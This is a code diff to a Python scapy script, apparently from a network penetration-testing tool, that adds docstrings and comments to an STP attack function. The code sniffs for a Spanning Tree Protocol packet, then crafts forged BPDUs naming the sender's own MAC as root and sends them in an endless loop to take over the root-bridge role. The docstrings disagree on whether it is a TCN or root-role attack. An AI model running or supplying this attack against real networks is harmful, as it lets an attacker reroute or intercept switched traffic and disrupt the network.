@@ -7,9 +7,15 @@ from scapy.all import sendp,sniff,get_if_hwaddr
 
 
 def run(interface):
-
+    """
+    This function launch STP TCN ATTACK
+    :param interface: interface to be launched the attack
+    :type interface: str
+    """
+    # sniff to found a stp packet
     pkt = sniff(stop_filter=lambda x: x.haslayer(STP), iface=interface)
 
+    # Look for a STP packet to use a lower priority
     pk_list={x:y for x,y in pkt.sessions().iteritems() if "Other" in x}
     item=pk_list.popitem()
     pkts = item[1]
@@ -32,8 +38,7 @@ def run(interface):
     p_stp = STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=myMAC, bridgemac=myMAC,
                 rootid=root_id, bridgeid=bridge_id)
 
-
-    pkt = p_ether/p_llc/p_stp
+    pkt = p_ether/p_llc/p_stp   # STP packet structure
 
     try:
         while 1:
@@ -45,4 +50,9 @@ def run(interface):
 
 
 def run_attack(config):
+    """ This function is used for launch the STP ROOT ROLE attack
+    :param config: GlobalParameters option instance
+    :type config: `GlobalParameters`
+
+    """
     run(config.interface[0])
